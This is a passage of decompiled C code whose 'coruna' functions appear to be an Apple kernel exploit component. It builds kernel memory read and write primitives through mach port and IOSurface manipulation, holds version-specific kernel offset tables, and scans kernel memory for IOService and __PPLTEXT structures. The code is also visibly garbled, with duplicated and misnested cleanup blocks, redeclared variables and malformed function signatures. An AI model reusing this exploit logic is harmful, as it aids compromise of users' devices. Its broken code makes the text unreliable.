             (err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x20,&bootargs), err != 0)))))) &&
          (err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + *(int *)(handle + 0x168),&bootargs),
          err != 0)) &&
         (((err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x18,&scratch), err != 0 &&
           (scratch = coruna_ptr_canonicalize(handle,scratch), scratch != 0)) &&
          (err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,bootargs + 0x18,0), err == 0)))) {
        scratch = 0;
      }
      if (host_info != (void *)0x0) {
        _free(host_info);
      }
      if (1 < u) {
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)size);
      }
      if ((mach_port_name_t)thread_attr + 1 < 2) {
        return scratch;
      }
      _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)thread_attr);
      return scratch;
    }
  }
  return 0;
}





uint8_t * coruna_mach_port_allocate(long handle,uint64_t val,unsigned long arg)
{
  uint u;
  uint8_t *ptr;
  mach_port_name_t lm3;
  uint size;
  int err;
  uint8_t *buf;
  long handle;
  void *ptr;
  uint version;
  mach_port_name_t scratch;
  uint8_t bootargs[24];
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  size = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  lm3 = scratch;
  if (size != 0) {
    return (uint8_t *)(unsigned long)(size | 0x80000000);
  }
  buf = (uint8_t *)coruna_buf_init(bootargs);
  if ((int)buf == 0) {
    buf = (uint8_t *)coruna_kernel29bb0_via_buf_grow(bootargs,0xffffffff);
    if ((int)buf == 0) {
      buf = (uint8_t *)coruna_mach_msg(bootargs,0,lm3,0);
      coruna_free_1bd0c(bootargs);
      if ((int)buf == 0) {
        bootargs[0] = 2;
        size = *(uint *)(handle + 0x168);
        u = 0;
        version = (uint)arg;
        if (size != 0) {
          u = version / size;
        }
        if (((version == u * size) && (handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_11(handle,scratch), handle != 0)) &&
           (ptr = _calloc(arg & 0xffffffff,1), ptr != (void *)0x0)) {
          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,val,ptr,arg);
          _free(ptr);
          if ((err != 0) && (err = coruna_kernel29bb0_residual_167(handle,handle + 0x24,val), err != 0)) {
            size = 0;
            if (*(uint *)(handle + 0x168) != 0) {
              size = version / *(uint *)(handle + 0x168);
            }
            err = coruna_mach_vm_machine_attribute(handle,handle + 0x30,size);
            if (err != 0) {
              err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + 0x2f,bootargs,1);
              size = 0x1001;
              if (err != 0) {
                size = 0;
              }
              buf = (uint8_t *)(unsigned long)size;
              _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
              return buf;
            }
          }
        }
        buf = &k_kernel_slot_1001;
      }
    }
    else {
      coruna_free_1bd0c(bootargs);
    }
  }
fail:
  _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  return buf;
}





long coruna_mach_port_allocate_2248c(long handle,uint *size)
{
  int err;
  uint u;
  uint size;
  uint8_t *ptr;
  mach_port_name_t lm5;
  uint version;
  kern_return_t lk7;
  int status;
  void *ptr;
  long handle;
  long addr;
  int flags;
  size_t ls13;
  uint port;
  short scratch;
  mach_port_name_t bootargs;
  long thread_attr [3];
  
  port = *size;
  version = coruna_iosurface_buf_size();
  ptr = k_kernel_mach_task_self_slot;
  if (version == 0) {
    return 0;
  }
  if (version <= port) {
    version = *(uint *)(handle + 0x180);
    u = 0;
    if (version != 0) {
      u = port / version;
    }
    err = port - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    port = status + port;
  }
  version = *(uint *)(handle + 0x168);
  if (port < version * 0x3fff) {
    bootargs = 0;
    u = 0;
    if (version != 0) {
      u = port / version;
    }
    err = port - u * version;
    status = 0;
    if (err != 0) {
      status = version - err;
    }
    lk7 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&bootargs);
    if (lk7 != 0) {
      return 0;
    }
    version = status + port;
    ptr = _calloc((unsigned long)version,1);
    lm5 = bootargs;
    addr = 0;
    u = *(uint *)(handle + 0x168);
    size = 0;
    if (u != 0) {
      size = version / u;
    }
    if ((version == size * u) && (status = coruna_buf_init(thread_attr), status == 0)) {
      u = 0;
      if (*(uint *)(handle + 0x168) != 0) {
        u = version / *(uint *)(handle + 0x168);
      }
      status = coruna_kernel29bb0_via_buf_grow_2(thread_attr,ptr,u);
      if (status == 0) {
        status = coruna_mach_msg(thread_attr,0,lm5,0);
        coruna_free_1bd0c(thread_attr);
        addr = 0;
        }
        cleanup:
        _free(ptr);
        _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
        if (addr == 0) {
        return 0;
      }
check_ok:
      coruna_free_1bd0c(thread_attr);
    }
    addr = 0;
    }
    cleanup:
    _free(ptr);
    _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
    if (addr == 0) {
    return 0;
  }
  bootargs = 0;
  lk7 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&bootargs);
  if (lk7 != 0) {
    return 0;
  }
  status = coruna_return_zero_2dae4(handle);
  ls13 = 0xffffffdc;
  if ((port < 0x25) || (port < status + 0x68U)) {
skip:
    ptr = _calloc(ls13,1);
    lm5 = bootargs;
    if (ptr != (void *)0x0) {
      status = coruna_buf_init(thread_attr);
      addr = 0;
      }
      cleanup:
      _free(ptr);
      _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
      if (addr == 0) {
      return 0;
      }
      addr = 0;
      }
      cleanup:
      _free(ptr);
      _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
      if (addr == 0) {
      return 0;
      }
      bootargs = 0;
      lk7 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&bootargs);
      if (lk7 != 0) {
      return 0;
      }
      status = coruna_return_zero_2dae4(handle);
      ls13 = 0xffffffdc;
      if ((port < 0x25) || (port < status + 0x68U)) {
      skip:
      ptr = _calloc(ls13,1);
      lm5 = bootargs;
      if (ptr != (void *)0x0) {
      status = coruna_buf_init(thread_attr);
      addr = 0;
      }
      cleanup:
      _free(ptr);
      _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
      if (addr == 0) {
      return 0;
    }
  }
  else if (0x28 < port) {
    if (port < status + 0x6cU) {
      flags = 0x24;
    }
    else {
      version = 4;
      err = 0x6c;
      do {
        flags = err;
        if (port <= flags - 0x40U) break;
        version = version + 4;
        err = flags + 4;
      } while (status + (version / 3 & 0x7ffffffc) + flags + 4 <= port);
      flags = flags + -0x44;
    }
    ls13 = (size_t)(flags - 0x24U);
    ptr = _calloc(ls13,1);
    lm5 = bootargs;
    if (ptr != (void *)0x0) {
    status = coruna_buf_init(thread_attr);
    addr = 0;
    }
  }
fail:
  addr = 0;
next:
  _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
  if (addr == 0) {
    return 0;
  }
  if (port != *size) {
    *size = port;
    return addr;
  }
  return addr;
}





long coruna_vm_deallocate_2c8ec(uint64_t val,uint *size)
{
  uint8_t *ptr;
  uint u;
  kern_return_t lk3;
  int err;
  long handle;
  unsigned long size;
  vm_address_t scratch;
  uint bootargs;
  
  bootargs = *size;
  handle = coruna_mach_port_allocate_2248c(val,&bootargs);
  u = bootargs;
  ptr = k_kernel_mach_task_self_slot;
  if (handle != 0) {
    scratch = 0;
    size = (unsigned long)bootargs;
    lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,1);
    if (lk3 == 0) {
      err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(val,handle,scratch,size);
      if (err != 0) {
        if (u != *size) {
          *size = u;
        }
        _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
        return handle;
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
    coruna_mach_port_allocate(val,handle,size);
  }
  return 0;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_5(uint *arg,uint64_t val,uint64_t n,int m,
                  uint16_t p)

{
  uint port;
  int err;
  unsigned long u;
  long addr;
  long serial_10;
  uint block_ctx;
  uint cache_33;
  uint scratch;
  uint cache_24;
  uint stack_guard;
  uint host_info;
  long serial_buf;
  uint64_t sa_saved;
  uint16_t cache_40;
  
  serial_buf = 0;
  sa_saved = 0;
  if ((*arg & 0x5584201) == 0) {
    return 0xad008;
  }
  cache_40 = p;
  u = coruna_slab_table_walk(arg,&host_info,&stack_guard,&cache_24,&scratch);
  if ((int)u != 0) {
    return u;
  }
  u = coruna_host_processor_count(arg,n,&sa_saved);
  if ((int)u != 0) {
    return u;
  }
  addr = coruna_kernel29bb0_via_return_zero_1f078(arg,val);
  if (addr == 0) {
    return 0x2800e;
  }
  err = coruna_kernel29bb0_trampoline_0001a670(arg,addr + (unsigned long)host_info,&serial_buf);
  if (err == 0) {
    return 0x2800f;
  }
  if ((serial_buf != 0) && (serial_10 = coruna_ptr_canonicalize(arg), serial_10 == 0)) {
    return 0x28026;
  }
  err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,addr + (unsigned long)host_info,sa_saved);
  if (err == 0) {
    return 0x28010;
  }
  if (m != 0) {
    err = coruna_kernel29bb0_via_ioconnectcallmethod(arg,addr + (unsigned long)stack_guard,&cache_33);
    if (err == 0) {
      return 0x2800f;
    }
    if (3 < cache_33) {
      return 0x28011;
    }
    err = coruna_kernel29bb0_via_ioconnectcallmethod(arg,addr + (unsigned long)cache_24,&block_ctx);
    if (err == 0) {
      return 0x2800f;
    }
    if (12000000 < block_ctx) {
      return 0x28011;
    }
    err = coruna_mach_vm_machine_attribute(arg,addr + (unsigned long)stack_guard,1);
    if (err == 0) {
      return 0x28010;
    }
    err = coruna_mach_vm_machine_attribute(arg,addr + (unsigned long)cache_24,12000000);
    if (err == 0) {
      return 0x28010;
    }
  }
  err = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,addr + (unsigned long)scratch,2,&cache_33);
  if (err == 0) {
    return 0x2800f;
  }
  if (0x7f < (ushort)cache_33) {
    return 0x28011;
  }
  err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,addr + (unsigned long)scratch,&cache_40,2);
  port = 0;
  if (err == 0) {
    port = 0x28010;
  }
  return (unsigned long)port;
}





uint64_t coruna_slab_table_walk(uint *size,uint *flags_2,int *flags,int *count_2,int *fd_3)
{
  bool err;
  bool status;
  int err;
  int status;
  uint u;
  uint size;
  int flags;
  uint version;
  int count;
  unsigned long port;
  int idx;
  
  size = 0x5584001;
  port = *(unsigned long *)(size + 0x56);
  version = *size;
  if (0x44a < port >> 0x2b) {
    size = 0x5584201;
  }
  if ((version & size) == 0) {
    return 0xad008;
  }
  size = size[0x50];
  if ((int)size < 0x2258) {
    if (size - 0x1f53 < 2) {
      if ((version >> 0x14 & 1) == 0) {
        flags = 0x16c;
        if (port < 0x1f530f02800000) {
          flags = 0x170;
        }
        size = 0x210;
        if (port < 0x1f530f02800000) {
          size = 0x280;
        }
        count = 0x1b4;
        if (port < 0x1f530f02800000) {
          count = 0x224;
        }
        status = 0x174;
        if (port < 0x1f530f02800000) {
          status = 0x178;
        }
        u = 0x218;
        if (port < 0x1f530f02800000) {
          u = 0x288;
        }
        idx = 0x1bc;
        if (port < 0x1f530f02800000) {
          idx = 0x22c;
        }
        status = (version & 0x84000) != 0;
        if (status) {
          count = idx;
          flags = status;
          size = u;
        }
        status = 0x184;
        if (status) {
          status = 0x18c;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x1f530f027ffffe < port;
      status = port == 0x1f530f027fffff;
      flags = 0x17c;
      if (port < 0x1f530f02800000) {
        flags = 0x180;
      }
      size = 0x220;
      if (port < 0x1f530f02800000) {
        size = 0x290;
      }
      count = 0x1c4;
      if (port < 0x1f530f02800000) {
        count = 0x230;
      }
      idx = 400;
      status = 0x194;
    }
    else {
      if (size != 0x1809) {
        if (size != 0x1c1b) {
          return 0x2802c;
        }
        status = (version & 0x84000) != 0;
        version = 0x280;
        if (status) {
          version = 0x288;
        }
        status = 0x16c;
        if (status) {
          status = 0x174;
        }
        idx = 0x22c;
        if (status) {
          idx = 0x234;
        }
        err = 0x184;
        if (status) {
          err = 0x18c;
        }
        status = 0x1c1b19145fffff < port;
        size = 0x1c0;
        if (status) {
          size = version;
        }
        count = 0x16c;
        flags = 0xac;
        if (status) {
          count = idx;
          flags = status;
        }
        status = 0xc4;
        if (status) {
          status = err;
        }
        *flags_2 = size;
        *flags = flags;
        *count_2 = count;
        *fd_3 = status;
        return 0;
      }
      err = 0x18090a095ffffe < port;
      status = port == 0x18090a095fffff;
      size = 0x1a0;
      if (port < 0x18090a09600000) {
        size = 0x1a8;
      }
      flags = 0xa4;
      if (port < 0x18090a09600000) {
        flags = 0xac;
      }
      count = 0x14c;
      if (port < 0x18090a09600000) {
        count = 0x154;
      }
      idx = 0xc4;
      status = 0xbc;
    }
    if (!err || status) {
      status = idx;
    }
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  if ((size != 0x2258) && (size != 0x225c)) {
    if (size != 0x2712) {
      return 0x2802c;
    }
    version = version & 0x518e241;
    if (version < 0x100000) {
      if (version == 1) {
        version = 0;
      }
      else {
        if ((version != 0x4000) && (version != 0x80000)) {
          return 0x2802c;
        }
        version = 0x10;
      }
    }
    else if ((version == 0x100000) || (version == 0x1000000)) {
      version = 0x18;
    }
    else {
      if (version != 0x4000000) {
        return 0x2802c;
      }
      version = 0x68;
    }
    size = version | 0x200;
    flags = version + 0x164;
    count = version + 0x1b4;
    status = version + 0x17c;
    *flags_2 = size;
    *flags = flags;
    *count_2 = count;
    *fd_3 = status;
    return 0;
  }
  version = version & 0x518e241;
  if (version < 0x80000) {
    if (version == 1) {
      status = 0x10;
    }
    else {
      if (version != 0x200) {
        if (version != 0x4000) {
          return 0x2802c;
        }
        goto done;
      }
      status = 0;
    }
  }
  else if (version == 0x80000) {
done:
    status = 0x20;
  }
  else {
    if ((version != 0x100000) && (version != 0x1000000)) {
      return 0x2802c;
    }
    status = 0x28;
  }
  size = status + 0x1e8;
  flags = status + 0x154;
  count = status + 0x19c;
  status = status + 0x16c;
fail:
  *flags_2 = size;
  *flags = flags;
  *count_2 = count;
  *fd_3 = status;
  return 0;
}





void coruna_host_processor_count(long handle,int flags,uint64_t *val)
{
  long handle;
  uint64_t u;
  uint scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 4;
  if ((*(long *)(handle + 0x248) == 0) || (*(long *)(handle + 0x250) == 0)) {
    u = coruna_host_processors(handle,2,&bootargs,&scratch);
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = 0;
  handle = 0x248;
  if (flags == 0) {
    handle = 0x250;
  }
  *val = *(uint64_t *)(handle + handle);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





long coruna_return_zero_30860(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_4(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-2];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-1];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (addr_2 - off_3) + arg;
}





void coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_4(uint *size)
{
  long handle;
  long addr;
  int err;
  uint64_t u;
  long off;
  long base;
  unsigned long size;
  unsigned long scratch;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  off = *(long *)(size + 0x626);
  if (off == 0) {
    scratch = scratch & 0xffffffff00000000;
    off = coruna_return_zero_1528c(*(uint64_t *)(size + 0x67e),&scratch);
    if (off == 0 || (uint)scratch == 0) {
      u = 0xad011;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    *(long *)(size + 0x626) = off;
    size[0x628] = (uint)scratch;
done:
    base = 0;
    size = 0;
    do {
      scratch = 0;
      scratch = 0;
      bootargs = 0;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(size,off + base,0x18,&scratch);
      if (err == 0) {
        u = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return;
        }
        ___stack_chk_fail(u);
      }
      addr = bootargs;
      if ((*size & 0x20) != 0) {
        addr = bootargs << 0xe;
      }
      handle = (long)size + base;
      *(unsigned long *)(&k_kernel_slot_1a08 + handle) = scratch;
      *(uint64_t *)(&k_kernel_slot_1a10 + handle) = scratch;
      *(long *)(&k_kernel_slot_1a18 + handle) = addr;
      size = size + 1;
      base = base + 0x18;
    } while (size < size[0x628]);
  }
  else if (size[0x628] != 0) goto done;
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





long coruna_return_zero_30860_230e0(long handle,long addr_2,long off_3,unsigned long arg)
{
  int err;
  unsigned long u;
  long *ptr;
  unsigned long size;
  
  if (0x1808 < *(int *)(handle + 0x140)) {
    if ((*(long *)(&k_kernel_slot_1a18 + handle) == 0) && (err = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_4(handle), err != 0)) {
      return 0;
    }
    u = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle);
    if (*(uint *)(&k_kernel_slot_18a0 + handle) != 0) {
      ptr = (long *)(&k_kernel_slot_1a18 + handle);
      do {
        size = ptr[-1];
        if ((size <= arg) && (arg < *ptr + size)) {
          return (arg - size) + ptr[-2];
        }
        ptr = ptr + 3;
        u = u - 1;
      } while (u != 0);
    }
  }
  return (off_3 - addr_2) + arg;
}





uint64_t coruna_return_zero_23190(long handle,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  scratch = 0;
  bootargs = 0;
  if (*(long *)(&k_kernel_slot_18a8 + handle) == 0) {
    handle = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078(handle);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_20958(handle,handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle,&bootargs);
    if ((err == 0) ||
       (err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + *(int *)(handle + 0x168),&scratch), err == 0)
       ) {
      return 0;
    }
    *(long *)(&k_kernel_slot_18a8 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_18b0 + handle) = scratch;
  }
  else {
    scratch = *(uint64_t *)(&k_kernel_slot_18b0 + handle);
    bootargs = *(long *)(&k_kernel_slot_18a8 + handle);
  }
  u = coruna_return_zero_30860_230e0(handle,bootargs,scratch,val);
  return u;
}





void coruna_kernel09_via_mach_port_allocate(long handle)
{
  long handle;
  uint u;
  uint size;
  unsigned long version;
  long addr;
  uint64_t port;
  long scratch;
  int bootargs [32];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x18] = 0;
  bootargs[0x19] = 0;
  bootargs[0x16] = 0;
  bootargs[0x17] = 0;
  bootargs[0x1c] = 0;
  bootargs[0x1d] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x10] = 0;
  bootargs[0x11] = 0;
  bootargs[0xe] = 0;
  bootargs[0xf] = 0;
  bootargs[0x14] = 0;
  bootargs[0x15] = 0;
  bootargs[0x12] = 0;
  bootargs[0x13] = 0;
  bootargs[8] = 0;
  bootargs[9] = 0;
  bootargs[6] = 0;
  bootargs[7] = 0;
  bootargs[0xc] = 0;
  bootargs[0xd] = 0;
  bootargs[10] = 0;
  bootargs[0xb] = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  scratch = 0;
  bootargs[4] = 0;
  bootargs[5] = 0;
  bootargs[2] = 0;
  bootargs[3] = 0;
  size = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x268));
  if (size == 0) {
    addr = 0;
    do {
      if ((*(long *)(handle + addr + 0x2b0) != 0) && (*(int *)(handle + addr + 0x2b8) != 0)) {
        handle = handle + addr;
        port = *(uint64_t *)(handle + 0x2b0);
        *(uint64_t *)((long)bootargs + addr) = *(uint64_t *)(handle + 0x2b8);
        *(uint64_t *)((long)bootargs + addr + -8) = port;
        *(uint64_t *)(handle + 0x2b8) = 0;
        *(uint64_t *)(handle + 0x2b0) = 0;
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x268));
    addr = 0;
    do {
      if (*(long *)((long)bootargs + addr + -8) != 0) {
        if ((*(int *)((long)bootargs + addr) != 0) &&
           if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
           return;
           }
           ___stack_chk_fail(version);
      }
      addr = addr + 0x10;
    } while (addr != 0x80);
    version = 0;
  }
  else {
    u = -size;
    if (-1 < (int)size) {
      u = size;
    }
    version = (unsigned long)(u | 0x40000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(version);
}





unsigned long coruna_ioservice_path(long arg,unsigned long val)

{
  int j;
  uint64_t tag;
  long serial_11;
  unsigned long size;
  int scratch [3];
  int host_info;
  uint serial_buf;
  unsigned long thread_attr;
  
  if (val == 0) {
    thread_attr = val;
    tag = _IORegistryEntryFromPath
                      (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IOService:/");
    if ((int)tag + 1U < 2) {
      return 0;
    }
    serial_11 = coruna_ret_stub_2(arg,tag);
    if (serial_11 == 0) {
      return 0;
    }
    thread_attr = coruna_return_zero_1f078(arg,serial_11);
    if (thread_attr == 0) {
      return 0;
    }
    j = coruna_kernel29bb0_trampoline_0001a670(arg,thread_attr,&thread_attr);
    if (j == 0) {
      return 0;
    }
    thread_attr = coruna_kernel29bb0_via_ctx_test_flag_3(arg,thread_attr);
    j = coruna_kernel29bb0_trampoline_0001a670(arg,thread_attr,&thread_attr);
    if (j == 0) {
      return 0;
    }
    val = coruna_kernel29bb0_via_ctx_test_flag_3(arg,thread_attr);
  }
  serial_11 = 0x4000;
  if (*(int *)(arg + 0x180) != 0x4000) {
    serial_11 = 0x100000;
  }
  size = val & -serial_11;
  if (*(int *)(arg + 0x180) != 0x4000) {
    size = (val & -serial_11) + 0x4000;
  }
  if (size < 0xffff000000000000) {
    return 0;
  }
  thread_attr = val;
  do {
    j = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,size,4,scratch);
    if (j == 0) {
      return 0;
    }
    if (scratch[0] == -0x1120531) {
      j = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,size + 4,0x18,(unsigned long)scratch | 4);
      if (j == 0) {
        return 0;
      }
      if (((host_info == 2) && (8 < serial_buf)) && (serial_buf < 0x40)) {
        return size;
      }
    }
    size = size - serial_11;
    if (size < 0xffff000000000000) {
      return 0;
    }
  } while( true );
}





void coruna_find_ppltext_234f0(uint64_t *val,long handle)
{
  int err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  err = coruna_ctx_test_flag(handle,0x20);
  if ((err == 0) && (err = coruna_ctx_test_flag(handle,0x5184001), err != 0)) {
    coruna_macho_find_loadcmd(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
  }
  else {
    coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
  }
  val[1] = scratch;
  *val = scratch;
  val[2] = bootargs;
  return;
}





uint64_t
void coruna_task_info_249e8(long handle,uint64_t val,int flags,uint64_t id_2,unsigned long arg)
{
  kern_return_t lk1;
  int err;
  long handle;
  uint64_t u;
  task_flavor_t flavor;
  unsigned long size;
  uint version;
  mach_msg_type_number_t scratch;
  uint8_t bootargs[32];
  uint64_t thread_attr[4];
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) goto fail;
    if (err == 0x1809) {
      version = 0xa0;
      if (flags - 1U < 2) {
      scratch = 2;
      flavor = 0xd;
      err = 8;
      }
      else {
      if (flags != 3) {
      return 0;
      }
      version = version + 8;
      scratch = 8;
      flavor = 0xf;
      err = 0x20;
      }
      if (err == (int)arg) {
      lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
      if (lk1 == 0) {
      handle = coruna_kernel29bb0_via_return_zero_1f078(handle,val);
      if (handle == 0) {
      return 0;
      }
      handle = handle + (unsigned long)version;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
      return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
      if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
      (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
      *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
      *(long *)(&k_kernel_slot_1900 + handle) = handle;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_1acd4(handle,handle,id_2,arg);
      return u;
      }
      }
      }
      return 0;
    }
    if (err != 0x1c1b) {
      return 0;
    }
    version = 0x94;
    size = 0x1c1b19145fffff;
  }
  else {
    if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
      return 0;
    }
fail:
    version = 0x40;
    size = 0x1f530f027fffff;
  }
  if (*(unsigned long *)(handle + 0x158) <= size) {
    version = 0x9c;
  }
done:
  if (flags - 1U < 2) {
    scratch = 2;
    flavor = 0xd;
    err = 8;
  }
  else {
    if (flags != 3) {
      return 0;
    }
    version = version + 8;
    scratch = 8;
    flavor = 0xf;
    err = 0x20;
  }
  if (err == (int)arg) {
    lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
    if (lk1 == 0) {
      handle = coruna_kernel29bb0_via_return_zero_1f078(handle,val);
      if (handle == 0) {
        return 0;
      }
      handle = handle + (unsigned long)version;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle,arg & 0xffffffff,bootargs);
      if ((int)u == 0) {
        return u;
      }
      err = _memcmp(bootargs,thread_attr,arg & 0xffffffff);
      if (err == 0) {
        if (((*(long *)(&k_kernel_slot_1900 + handle) == 0) && (flags == 2)) &&
           (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)) {
          *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
          *(long *)(&k_kernel_slot_1900 + handle) = handle;
        }
        u = coruna_call_mach_vm_machine_attribute_29df8_1acd4(handle,handle,id_2,arg);
        return u;
      }
    }
  }
  return 0;
}





uint coruna_pthread_attr_setdetachstate_2e9c4(long handle,uint64_t *val,uint64_t id_2,void *ctx)
{
  uint u;
  mach_port_t target_act;
  int err;
  uint size;
  void **lppv4;
  pthread_t scratch;
  pthread_attr_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = (pthread_t)0x0;
  u = _pthread_attr_init(&bootargs);
  if (u != 0) {
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
    }
    ___stack_chk_fail(u);
  }
  u = _pthread_attr_setdetachstate(&bootargs,1);
  if (u == 0) {
    lppv4 = (void **)coruna_fn_ptr_cast(id_2);
    u = _pthread_create_suspended_np(&scratch,&bootargs,lppv4,ctx);
    size = -u;
    if (-1 < (int)u) {
    size = u;
    }
    size = size | 0x40000000;
    }
    u = _pthread_attr_destroy(&bootargs);
    fail:
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  else {
done:
    size = -u;
    if (-1 < (int)u) {
      size = u;
    }
    size = size | 0x40000000;
  }
  u = _pthread_attr_destroy(&bootargs);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_4(uint64_t arg,uint64_t val,uint64_t n)

{
  void (*ptr)(void);
  int err;
  long serial_11;
  long addr;
  unsigned long kind;
  unsigned long unaff_x30;
  uint8_t tmp_buf[8];
  
  if ((int)val != 0) {
    serial_11 = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_2(arg,val,0);
    kind = 0;
    if ((((serial_11 != 0) && (addr = coruna_return_zero_21078(arg,n), kind = 0, addr != 0)) &&
